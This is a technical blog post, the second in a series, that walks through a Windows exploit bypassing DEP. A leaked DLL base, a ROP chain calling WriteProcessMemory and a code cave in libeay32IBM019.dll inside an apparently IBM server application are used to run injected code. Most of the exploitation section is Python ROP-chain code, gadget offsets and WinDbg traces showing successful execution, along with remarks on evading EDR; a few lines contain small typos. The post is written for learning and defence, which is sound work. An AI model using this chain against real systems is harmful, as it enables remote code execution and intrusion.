---
title: "advanced memory protection bypasses, part 2: bypassing DEP"
date: 2024-11-23T10:06:17-05:00
draft: false
toc: true
next: true
nomenu: false
notitle: false
---

## tl;dr

in [part 1](https://bsssq.xyz/posts/aslr_rop/), i talked about bypassing ASLR via information leaks. this time, we'll try to bypass **DEP** (Data Execution Prevention) using a very specific method: leveraging `WriteProcessMemory` to copy shellcode into an already-executable region. 

this post breaks down the internals of a Windows exploitation technique that leverages `WriteProcessMemory` and PE section manipulation to bypass memory protections. through careful ROP chain construction and code cave utilization in executable memory, we achieve reliable code execution while maintaining minimal forensic footprint. the analysis covers stack pivot mechanics, parameter chain validation, and the nuances of DLL memory layout - elements critical for both offensive development and defensive understanding of Windows memory corruption.

## `WriteProcessMemory`

using `WriteProcessMemory` provides a very powerful advantage: it takes advantage of Windows memory protection granularity, specifically at the page-level rather than the byte-level.

this technique is more stable in ASLR environments because code sections typically have more predictable layouts than heap/stack.

the [function prototype](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) is as follows.

```c
BOOL WriteProcessMemory(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);
```

- `hProcess`: this is the **process handle**. for the current process, we set it to `-1` (i.e. `-1 = GetCurrentProcess()`).

- `lpBaseAddress`: this is the **target address**, which must be in committed memory. in our case, it will be the destination address in the code cave (more on code caves later).

- `lpBuffer`: this is the **source buffer** in the calling process's address space. this will be our shellcode.

- `nSize`: the **size** of data to copy. this must account for page boundaries if crossing pages.

- `*lpNumberOfBytesWritten`: this points to the caller's memory. it's optional, and can be `NULL` in exploit scenarios.

some relevant checks are then performed, that look something like this:

```c
if (!IsAddressValid(lpBaseAddress) || !IsAddressValid(lpBaseAddress + nSize - 1))
    return FALSE;
```

then, the protection modification occurs at the page-level.

```c
MEMORY_BASIC_INFORMATION mbi;
VirtualQuery(lpBaseAddress, &mbi, sizeof(mbi));
```

this temporarily changes page protection via an internal `NtProtectVirtualMemory` call. this is why we don't need to handle `PAGE_EXECUTE_READ` -> `PAGE_EXECUTE_READWRITE`.

we can sum up what happens when `WriteProcessMemory` executes:

1. the system checks the **current protection level**.

```c
PAGE_EXECUTE_READ initial_protection = GetPageProtection(target_address);
```

2. there is then an **internal call** to `NtProtectVirtualMemory`.

```c
STATUS_SUCCESS = NtProtectVirtualMemory(
    ProcessHandle,
    &BaseAddress,
    &RegionSize,
    PAGE_EXECUTE_READWRITE,
    &OldProtection
);
```

3. a **memory copy** operation takes place.

```c
memcpy(target_address, source_buffer, size);
```

4. the protection is **restored**.

```c
STATUS_SUCCESS = NtProtectVirtualMemory(
    ProcessHandle,
    &BaseAddress,
    &RegionSize,
    initial_protection,
    &OldProtection
);
```

this technique can bypass HIPS/EDR solutions because it uses **legitimate API calls**, and the temporary protection change is harder to detect than permanent changes. ideally, this technique works even with CFG (Control Flow Guard) enabled, as the copied shellcode resides in legitimate code pages.

there are some well-known detection methods for this, though. for one, monitoring `WriteProcessMemory` calls to executable regions and tracking protection changes on code pages. we can also validate the code signature and integrity post-write. last, but not least, we can monitor execution flow into known code cave regions.

## code caves

### theory

![code cave diagram](/codecave4.png)

code caves are unused spaces within executable memory regions. they appear as a region of null bytes (`00`), and can occur due to any of the following reasons:

- compiler/linker memory alignment requirements.

- PE section padding, to meet page boundaries (4KB alignment).

- function alignment padding.

- removed or dead code, leaving gaps.

- optimization creating unused spaces between functions.

there are three types of code caves (by origin): natural (implicit), artificial (resource), and dynamic (function padding).

**natural caves** can stem from:

- end-of-section padding (most common).

- inter-function padding.

- alignment gaps.

they're also **predictable**, and often **null-filled**.

**artificial caves** can stem from:

- deliberately added padding.

- unused functions or data.

- legacy code spaces.

they're less predictable, and can sometimes contain **non-null** data.

**dynamic caves** stem from:

- runtime-generated spaces.

- JIT (Just In Time) compilation gaps.

- hot-patching reserved areas.

these are usually platform or version dependent.

in the '90s, code caves were used for **simple shellcode injection**, and they had fixed addresses. you could artificially inflate your high-score in a game by storing a basic payload inside memory.

today, code caves are used for multi-stage payloads, position-independent code, [evasion techniques](https://github.com/JavierYuste/Optimization-of-code-caves-in-malware-binaries-to-evade-Machine-Learning-detectors), and [complex exploit chains](https://web3.arxiv.org/pdf/2403.06428).

based on this, we can define our **ideal** code cave and its properties.

1. it has to be located in an **executable memory region**.

2. its size has to be **sufficient for a payload**.

3. it must be **stable** across program execution.

4. **no null bytes** should be in its address (so that our exploit remains stable).

5. it can't be used for legitimate program flow.

6. it must be **away from common execution** paths.

7. it must maintain the **original permissions**.

8. it must **survive program updates** and patches.

of course, the ideal scenario is also a dream scenario :) 

### architecture

![overview](/73.png)

code caves are fundamentally created in a scenario like below.

```asm
section .text
    ; normal compiled code
    push ebp
    mov ebp, esp
    ; ... functional code ...
    
    ; compiler/linker padding to next page boundary
    align 0x1000    ; forces alignment to 4KB page
```

this creates a code cave because of the section alignment requirements, the difference between Virtual and Physical sizes, and the padding requirements for memody pages.

following this logic, we can surmise that the code cave forms due to specific mechanisms, like the PE section alignment rules.

```c
typedef struct {
    DWORD SectionAlignment;
    DWORD FileAlignment;
} IMAGE_OPTIONAL_HEADER;
```

the `SectionAlignment` is usually `0x1000` (4KB) and the `FileAlignment` is usually `0x200` (512B). when `SectionAlignment` is greater than `FileAlignment`, the virtual size becomes `ALIGN_UP(Raw Size, SectionAlignment)`, meaning that implicit padding is created.

an example calculation of this can be like:

```c
size_t actual_code_size = 0x2345;  // actual compiled code
size_t aligned_size = (actual_code_size + 0xFFF) & ~0xFFF;  // rounds up to 0x3000
size_t cave_size = aligned_size - actual_code_size;  // available cave space
```

recall the different types of caves, and we can define their architecture a little more clearly.

#### implicit caves

these are the most common, and created by section alignment.

```c
struct ImplicitCave {
    uint32_t start;
    uint32_t end;
    size_t size;
};
```

- `start`: this is the last used byte + 1.

- `end`: the start of the next section.

- `size`: usually up to 4KB - 1.

these have a predictable location, and reliable permissions. they also often contain null bytes.

#### function padding caves

these are created by compiler function alignment.

```c
struct FunctionPaddingCave {
    uint8_t alignment_nops[VAR_SIZE];
};
```

`alignment_nops[VAR_SIZE]` is usually 1 - 15 bytes long. some common patterns include:

- `0x90`: NOP.

- `0x66 0x90`: 66 NOP.

- `0x0F 0x1F 0x00`: multi-byte NOP.

#### resource caves

these are found in the `.rsrc` section. they're less useful because they're often READ-only and more monitored by security solutions.

```c
struct ResourceCave {
    uint32_t resource_alignment;
    uint8_t padding[VAR_SIZE];
};
```

`resource_alignment` is usually 8 bytes long, and `padding[VAR_SIZE]` is the alignment padding.

### memory protection

by analyzing the PTE (Page Table Entry) structure (x86), we can extrapolate to how to transition protection for our code cave.

```c
struct PTE {
    unsigned present:1;         // must be 1
    unsigned writable:1;        // R/W flag
    unsigned user_mode:1;       // user/supervisor
    unsigned write_through:1;   // cache policy
    unsigned cache_disabled:1;  // cache policy
    unsigned accessed:1;        // has page been accessed?
    unsigned dirty:1;          // has page been written to?
    unsigned pat:1;            // page Attribute Table
    unsigned global:1;         // global page mapping
    unsigned ignored:3;        // available for system use
    unsigned frame:20;         // physical frame number
};
```

we could write a protection transition function: `void analyze_protection_transition(void* cave_addr)`. 

the pseudocode might be something like:

1. initial state (typical code section).

2. `PTE.writable = 0`

3. `PTE.present = 1`

4. `PTE.user_mode = 1`

translating this to our use case (during `WriteProcessMemory`), it will do some temporary PTE modification, followed by a TLB flush for the affected page, before invalidating the cache line and finally restoring permissions.

### detection + validation

to detect and validate the cave, we could write a function that looks something like this.

```c
bool validate_code_cave(void* candidate, size_t required_size) {
    // 1. memory pattern analysis
    bool has_nulls = true;
    for(size_t i = 0; i < required_size; i++) {
        if(((uint8_t*)candidate)[i] != 0) {
            has_nulls = false;
            break;
        }
    }
    
    // 2. permission verification
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(candidate, &mbi, sizeof(mbi));
    
    // 3. section boundary check
    bool crosses_boundary = check_section_boundary(candidate, required_size);
    
    // 4. execution path analysis
    bool in_execution_path = analyze_control_flow(candidate);
    
    return has_nulls && 
           (mbi.Protect & PAGE_EXECUTE_READ) && 
           !crosses_boundary && 
           !in_execution_path;
}
```

## locating our code cave

### is it present?

![code cave located](/firefox.gif)

using WinDbg and attaching it to our server application, we can find the code cave. 

you can find the offset to the PE header by dumping the `DWORD` at offset `0x3C` from the `MZ` header. we'll then add `0x2C` to the offset to find the offset to the code section.

```shell
> dd libeay32IBM019 + 3c L1
031f003c 00000108

> dd libeay32IBM019 + 108 + 2c L1
031f0134 00001000

>? libeay32IBM019 + 1000
Evaluate expression: 52367360 = 031f1000
```

the first command gets the PE header offset from the MZ header. it returns the value `0x108`. 

the second command attempts to find the code section offset, by using the PE header offset (`0x108`) and the offset to the code section (`0x2c`).

the last value we get is `031f1000`. this means the code section starts at `0x031f1000`.

we can use the `!address` command in WinDbg to get more information about the code section:

```shell
Usage:              Image
Base Address:       031f1000
End Address:        03283000
Region Size:        00092000 ( 584.000 kB)
State:              00001000    MEM_COMMIT
Protect:            00000020    PAGE_EXECUTE_READ
Type:               01000000    MEM_IMAGE
Allocation Base:    031f0000
Allocation Protect: 00000080    PAGE_EXECUTE_WRITECOPY
```

the code section starts at `0x031f1000` and ends at `0x03283000`. it has a size of `0x92000` (584KB), and has the permissions `PAGE_EXECUTE_READ`.

one way to find out if a code cave exists is to subtract a large enough value from the upper bound of the code section. if the code section's upper bound is `0x03283000`, we can subtract a value like `0x400` (equal to 1024 bytes) from it, to find the candidate address of the code cave.

```c
const uint32_t CODE_SECTION_END = 0x03283000;
const uint32_t REQUIRED_SPACE = 0x400;  // 1024 bytes
const uint32_t CANDIDATE_ADDR = CODE_SECTION_END - REQUIRED_SPACE;  // 0x03282c00
```

in WinDbg, you can subtract it directly.

```shell
> dd 03283000-400
03282c00 00000000 00000000 00000000 00000000
03282c10 00000000 00000000 00000000 00000000
03282c20 00000000 00000000 00000000 00000000
03282c30 00000000 00000000 00000000 00000000
03282c40 00000000 00000000 00000000 00000000
03282c50 00000000 00000000 00000000 00000000
03282c60 00000000 00000000 00000000 00000000
03282c70 00000000 00000000 00000000 00000000
```

the region between `0x03282c00` and `0x03283000` is a null-padded region. 

```shell
>? 03283000-400 - libeay32IBM019
Evaluate expression: 601088 = 00092c00
```

this shows that the code cave starts at offset `0x92c00` into the module (we'll use the offset `0x92c04` instead, to avoid all the potential null-byte issues during exploitation).

### using the `.data` section

we can view the `WriteProcessMemory` structure slightly differently now.

```c
BOOL WriteProcessMemory(
    HANDLE hProcess,              // -1 (0xFFFFFFFF) - pseudohandle
    LPVOID lpBaseAddress,        // dllBase + 0x92c04 (code cave)
    LPCVOID lpBuffer,            // stack address (needs ROP)
    SIZE_T nSize,                // shellcode size (needs ROP)
    SIZE_T *lpNumberOfBytesWritten // dllBase + 0xe401c (data section)
);
```

the reason we're going with the `.data` section over the stack is because it will have a predictable location. it's also going to be writable, plus no runtime address calculation is needed. the bonus is that it should survive process restarts.

```shell
> !d h - a libeay32IBM019
File Type: DLL
FILE HEADER VALUES
14C machine (i386)
6 number of sections

0 file pointer to symbol table
0 number of symbols
E0 size of optional header
2102 characteristics
Executable
32 bit word machine
DLL

SECTION HEADER #4
. data name
F018 virtual size
D5000 virtual address
CA00 size of raw data
D2000 file pointer to raw data
0 file pointer to relocation table
0 file pointer to line numbers
0 number of relocations
0 number of line numbers
C0000040 flags
Initialized Data
(no align specified)
Read Write
```

from the above, we find that the offset to the data section (RVA) is `0xD5000` and its size (Virtual Size) is `0xF018`. the raw size is `0xCA00` and it has flags `0xC000040`, which correspond to `Read-Write` (`RW`).

to check that the contents of the address aren't being used (also to verify memory protections), we'll need to dump the contents of the address just past the size value.

```shell
>? libeay32IBM019 + d5000 + f018 + 4
Evaluate expression: 53297180 = 032d401c

> dd 032d401c
032d401c 00000000 00000000 00000000 00000000
032d402c 00000000 00000000 00000000 00000000
032d403c 00000000 00000000 00000000 00000000
032d404c 00000000 00000000 00000000 00000000
032d405c 00000000 00000000 00000000 00000000
032d406c 00000000 00000000 00000000 00000000
032d407c 00000000 00000000 00000000 00000000
032d408c 00000000 00000000 00000000 00000000

>!vprot 032d401c
BaseAddress:        032d4000
AllocationBase:     031f0000
AllocationProtect:  00000080 PAGE_EXECUTE_WRITECOPY
RegionSize:         00001000
State:              00001000 MEM_COMMIT
Protect:            00000004 PAGE_READWRITE
Type:               01000000 MEM_IMAGE

> ? 032d401c - libeay32IBM019
Evaluate expression: 933916 = 000e401c
```

we find that the memory base address is `0x032d4000`, the protection is `PAGE_READWRITE`, and the state is `MEM_COMMIT`. we also found a writable, unused `DWORD` inside the `.data` section, located at offset `0xe401c`.

## exploitation

### ROP skeleton

we can now implement a call to this API using ROP. the PoC is a ROP skeleton that consists of the API address, return address, and the arguments to use `WriteProcessMemory` instead of `VirtualAlloc`.

in part 1, we used absolute addresses for ROP gadgets, but because of ASLR, we'll identify every gadget here as the base address of `libeay32IBM019` plus an offset. 

```python
libeay32IBM019Func = leakFuncAddr(b"N98E_CRYPTO_get_new_lockid", server)
dllBase = libeay32IBM019Func - 0x14E0  # base address calculation
print(str(hex(dllBase)))

# get address of WriteProcessMemory
WPMAddr = leakFuncAddr(b"WriteProcessMemory", server)
print(str(hex(WPMAddr)))

#psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x534)    # opcode
buf += pack("<i", 0x0)      # 1st memcpy: offset
buf += pack("<i", 0x700)    # 1st memcpy: size field
buf += pack("<i", 0x0)      # 2nd memcpy: offset
buf += pack("<i", 0x100)    # 2nd memcpy: size field
buf += pack("<i", 0x0)      # 3rd memcpy: offset
buf += pack("<i", 0x100)    # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

#psCommandBuffer aka WPM ROP chain construction
wpm = pack("<L", WPMAddr)                    # API address
wpm += pack("<L", (dllBase + 0x92c04))       # return addr (code cave)
wpm += pack("<L", 0xFFFFFFFF)                # process handle (-1)
wpm += pack("<L", (dllBase + 0x92c04))       # destination addr
wpm += pack("<L", 0x41414141)                # stack addr placeholder
wpm += pack("<L", 0x42424242)                # size placeholder
wpm += pack("<L", (dllBase + 0xe401c))       # bytes written ptr

offset = b"A" * (276 - len(wpm))
```

the base address is leaked through `N98E_CRYPTO_get_new_lockid` and all offsets are calculated from it. there's no need for complex ROP to resolve addresses.

the memory organization is like this:

```shell
exploit memory organization:
[buffer overflow padding]
[scanf trigger (0x534)]
[memcpy parameters]
[WPM ROP chain]
[additional padding (276 - len(wpm))]
```

### building the ROP chain

#### stack setup

we start with identifying a gadget that can help us obtain a clean copy of the `ESP` (stack pointer) register without clobbering other registers. it needs to be single-purpose, with a predictable execution, and mustn't have any side effects or complex instructions. it should also not rely on stack values beyond the return address.

this one does the trick.

```asm
0x100408d6: push esp ; pop esi ; ret
```

a quick aside: the reason for this is to get a reliable stack pointer and maintain control over the execution flow. it also gives us a clean register state for following operations.

we then need to find the `ImageBase` address from the PE header. since ASLR requires relative addressing, we won't be able to use the absolute address of the gadget above (`0x100408d6`), and so we'll need to calculate the offsets.

`ImageBase` provides a reliable reference point, and since all gadgets must be module-relative, this ensures exploit reliability across runs.



```shell
dd libeay32IBM019 + 3c L1     # gets PE header offset (0x108)
dd libeay32IBM019 + 108 + 34 L1  # gets ImageBase (0x10000000)

# gadget offset calculation
actual_offset = gadget_addr - 0x10000000
```

#### stack address resolution

the first phase of our ROP chain replaces the dummy stack address with the shellcode address. the first step of this phase is to align the `EAX` register with the shellcode address on the stack.

```python
eip = pack("<L", (dllBase + 0x408d6)) # push esp ; pop esi ; ret

# get shellcode address
rop = pack("<L", (dllBase + 0x408d6))  # push esp ; pop esi ; ret
rop += pack("<L", (dllBase + 0x296f))  # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242))        # ESI junk value
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
```

- `rop = pack("<L", (dllBase + 0x408d6))`: this cleans the `ESP` capture without assumptions.

- `rop += pack("<L", (dllBase + 0x296f))`: this gets the stack address in the working register.

- `rop += pack("<L", (0x42424242))`: this maintains the stack alignment.

`EAX` is needed for later arithmetic, `ESI` preserves the original stack pointer, and the junk values maintain the stack frame integrity.

#### avoiding null bytes

to do some stack address arithmetic (i.e. **avoiding nulls**), we'll need to use addition of negative values instead of direct subtraction. this is because exploit delivery often breaks on nulls, and large numbers ensure no null bytes.

in a two-part addition, we'll get precise control and maintain our numeric results without null bytes.

```python
# stack address arithmetic (avoiding nulls)
rop += pack("<L", (0x88888888))        # large value into ECX
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
rop += pack("<L", (0x77777878))        # second adjustment
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
```

`0x88888888` is the large, positive value (part 1 of the addition), and `0x77777878` is the complementary value (part 2).

#### `lpBuffer` patching mechanism

we'll need to obtain the stack address where the `lpBuffer` argument should be patched into `EAX`. this is because the gadget being used uses the `MOV [EAX], ECX` instruction, so the address of the shellcode needs to be moved into `ECX` first.

```python
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0xfffffee0)) # pop into eax
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
```

the first gadget uses a return instruction (with an offset of `0x10`). execution will then return to the `POP EAX` gadget's address on the stack, and the stack pointer is increased by `0x10`. because of this, we'll need to insert `0x10` junk bytes before the value `0xfffffee0` is popped into `EAX`.

the ROP chain then pops the value `0xfffffee0` into `EAX` and adds the contents of `ECX` to it. `0xfffffee0` corresponds to `-0x120`, which is the correct value to align `EAX` with the `lpBuffer` placeholder (aka the shellcode pointer) on the stack. the last gadget in the chain overwrites the `lpBuffer` argument with the real shellcode address.

you can verify this by placing a breakpoint on the gadget that writes the real shellcode address on the stack (`libeay32IBM019+0x1fd8`). you can then step over the `mov` instruction and display the ROP skeleton on the stack.

```shell
0:078> bp libeay32IBM019+0x 1fd8
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -

0:078> g
Breakpoint 0 hit
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
eip=03111fd8 esp=0dbbe364 ebp=41414141 iopl=0 nv up ei pl nz na pe cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
03111fd8 8908 mov dword ptr [eax],ecx ds:0023:0dbbe2fc=41414141

0:063> p
eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
eip=03111fda esp=0dbbe364 ebp=41414141 iopl=0 nv up ei pl nz na pe cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
03111fda c3 ret

0:063> dd eax-10 L7
0dbbe2ec 75f42890 031a2c04 ffffffff 031a2c04
0dbbe2fc 0dbbe41c 42424242 031f401c

0:063> dd 0dbbe41c L8
0dbbe41c 44444444 44444444 44444444 44444444
0dbbe42c 44444444 44444444 44444444 44444444
```

#### shellcode size: `nSize`

the ROP skeleton is almost complete. we'll need to overwrite the dummy shellcode size with the real one. the shellcode size doesn't need to be precise, and since most generated shellcodes are less than 500 bytes, we can use an arbitrary value of -524 (`0xffffdf4`) and then negate it to make it positive.

```python
# Patching nSize
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
rop += pack("<L", (dllBase + 0x408dd)) # push eax ; pop esi ; ret
rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret
rop +? pack("<L", (0xfffffdf4)) # -524
rop += pack("<L", (dllBase + 0x1d8c2)) # neg eax ; ret
rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
rop += pack("<L", (0x42424242)) # junk into esi
rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
rop += pack("<L", (0x42424242)) # junk for ret 0x10
```

here, we're increasing the `EAX` (which points to `lpBuffer`) by four to align it with the `nSize` argument.

we'll need to save the updated `EAX` pointer by copying it to `ESI`. since there no simple way to obtain the shellcode size in `ECX` with our available gadgets, we'll have to use `EAX` for the arithmetic and copy the result back to `ECX`.

for the final copy operation, we'll need to copy the content of `EAX` into `ECX` and restore `EAX` from `ESI`. recall a gadget from the previous section, that contained a return instruction with an offset of `0x10`. this will need to be accounted for in the ROP chain (`0x10` junk bytes).

```shell
0:079> bp libeay32IBM019+0x1fd8
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -
0:079> g
Breakpoint 0 hit
eax=1223e2fc ebx=073db868 ecx=1223e41c edx=77251670 esi=42424242 edi=00669360
eip=044e1fd8 esp=1223e364 ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
nv up ei pl nz na pe cy
efl=00000207
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
044e1fd8 8908 mov dword ptr [eax],ecx ds:0023:1223e2fc=41414141
0:085> g
Breakpoint 0 hit
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
eip=044e1fd8 esp=1223e3a0 ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
nv up ei pl nz ac pe cy
efl=00000217
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
044e1fd8 8908 mov dword ptr [eax],ecx ds:0023:1223e300=42424242
0:085> p
eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
nv up ei pl nz ac pe cy
efl=00000217
eip=044e1fda esp=1223e3a0 ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
044e1fda c3 ret
0:085> dd eax-14 L7
1223e2ec 75f42890 04572c04 ffffffff 04572c04
1223e2fc 1223e41c 0000020c 045c401c
```

the ROP chain patched the `nSize` argument correctly! nice.

#### final alignments

we've correctly located the address for `WriteProcessMemory`, prepared the return address (the code cave), and staged all the arguments on the stack. all we need now is precise stack alignment for the `WriteProcessMemory` call. this means aligning `EAX` with the `WriteProcessMemory` address in the ROP skeleton in the stack, exchanging it with `ESP`, and returning into it. easy, right?

we know that `EAX` points `0x14` bytes ahead of `WriteProcessMemory` on the stack. we can fix this with previously used gadgets.

```python
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
rop += pack("<L", (0xffffffec))        # -0x14 (distance to WPM setup)
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
```

the value `-0x14` (`0xffffffec`) was popped into `ECX`, added it to `EAX` and then used a gadget with an `xchg` instruction to align `ESP` to the stack address stored in `EAX`. `xchg` provides a nice, clean stack pivot.

after execution, we should return into `WriteProcessMemory` with all the arguments set up correctly. 

```shell
0:080> bp libeay32IBM019+0x5b415
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program
Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll -
0:080> g
Breakpoint 0 hit
eax=110ee2ec ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
nv up ei pl nz na po cy
efl=00000203
eip=031bb415 esp=110ee3b0 ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
031bb415 94 xchg eax,esp
0:085> p
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
nv up ei pl nz na po cy
efl=00000203
eip=031bb416 esp=110ee2ec ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x86:
031bb416 c3 ret
0:085> p
eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
nv up ei pl nz na po cy
efl=00000203
eip=75f42890 esp=110ee2f0 ebp=41414141 iopl=0
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
KERNEL32!WriteProcessMemoryStub:
75f42890 8bff mov edi,edi
0:085> dds esp L6
110ee2f0 0 3 1 f 2c 04 libeay32IBM019!N98E_bn_sub_words+0x107c
110ee2f4 ffffffff
110ee2f8 0 3 1 f 2c 04 libeay32IBM019!N98E_bn_sub_words+0x107c
110ee2fc 110ee41c
110ee300 0000020c
110ee304 0324401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
```

breakpoint on the `0x5b415 - xchg` instruction shows a clean before-and-after picture.

```shell
Breakpoint Analysis (0x5b415 - xchg instruction):

initial state:
EAX=110ee2ec EBX=05fbf4d8 ECX=ffffffec EDX=77251670 
ESI=42424242 EDI=00669360
ESP=110ee3b0 EBP=41414141 EIP=031bb415

post-xchg State:
EAX=110ee3b0 (old ESP)
ESP=110ee2ec (aligned to WPM setup)
EIP=031bb416 (ready for ret)

final execution state:
EIP=75f42890 (WPM entry)
ESP=110ee2f0 (properly aligned for call)
```

note that `lpBuffer` is stored at `0x110ee41c`. 

#### verifications

dump the contents of the code cave before and after the API executes.

```shell
0:085> u 031f2c04
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 0000 add byte ptr [eax],al
031f2c06 0000 add byte ptr [eax],al
031f2c08 0000 add byte ptr [eax],al
031f2c0a 0000 add byte ptr [eax],al
031f2c0c 0000 add byte ptr [eax],al
031f2c0e 0000 add byte ptr [eax],al
031f2c10 0000 add byte ptr [eax],al
031f2c12 0000 add byte ptr [eax],al
0:085> p t
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b
ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
KERNELBASE!WriteProcessMemory+0x74:
745f82a4 c21400 ret 14h
0:085> u 031f2c04
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 44 inc esp
031f2c05 44 inc esp
031f2c06 44 inc esp
031f2c07 44 inc esp
031f2c08 44 inc esp
031f2c09 44 inc esp
031f2c0a 44 inc esp
031f2c0b 44 inc esp
```

the contents here show that our fake shellcode data (`0x44` bytes) was copied from the stack into the code cave.

using the `INC ESP` instructions (`0x44` opcode), we can prove that DEP was bypassed.

```shell
0:085> r
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
KERNELBASE!WriteProcessMemory+0x74:
745f82a4 c21400 ret 14h
0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c04 esp=110ee308 ebp=41414141 iopl=0 nv up ei pl nz na po nc cs=001b
ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
libeay32IBM019!N98E_bn_sub_words+0x107c:
031f2c04 44 inc esp
0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c05 esp=110ee309 ebp=41414141 iopl=0 nv up ei pl nz na pe nc cs=001b
ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
libeay32IBM019!N98E_bn_sub_words+0x107d:
031f2c05 44 inc esp
0:085> p
eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
eip=031f2c06 esp=110ee30a ebp=41414141 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
libeay32IBM019!N98E_bn_sub_words+0x107e:
031f2c06 44 inc esp
```

`EIP` for the `WriteProcessMemory` return is `745f82a4`, which corresponds to `KERNELBASE!WriteProcessMemory+0x74`, and `ESP` is `110ee2f0`. the return value is `EAX=1`, meaning it's a success.

on the code cave execution side, the `EIP` was `031f2c04` and the `ESP` was `110ee308`. the execution proof also showed that each instruction was executed successfully.

```asm
    031f2c04: 44       inc esp
    031f2c05: 44       inc esp
    031f2c06: 44       inc esp
```
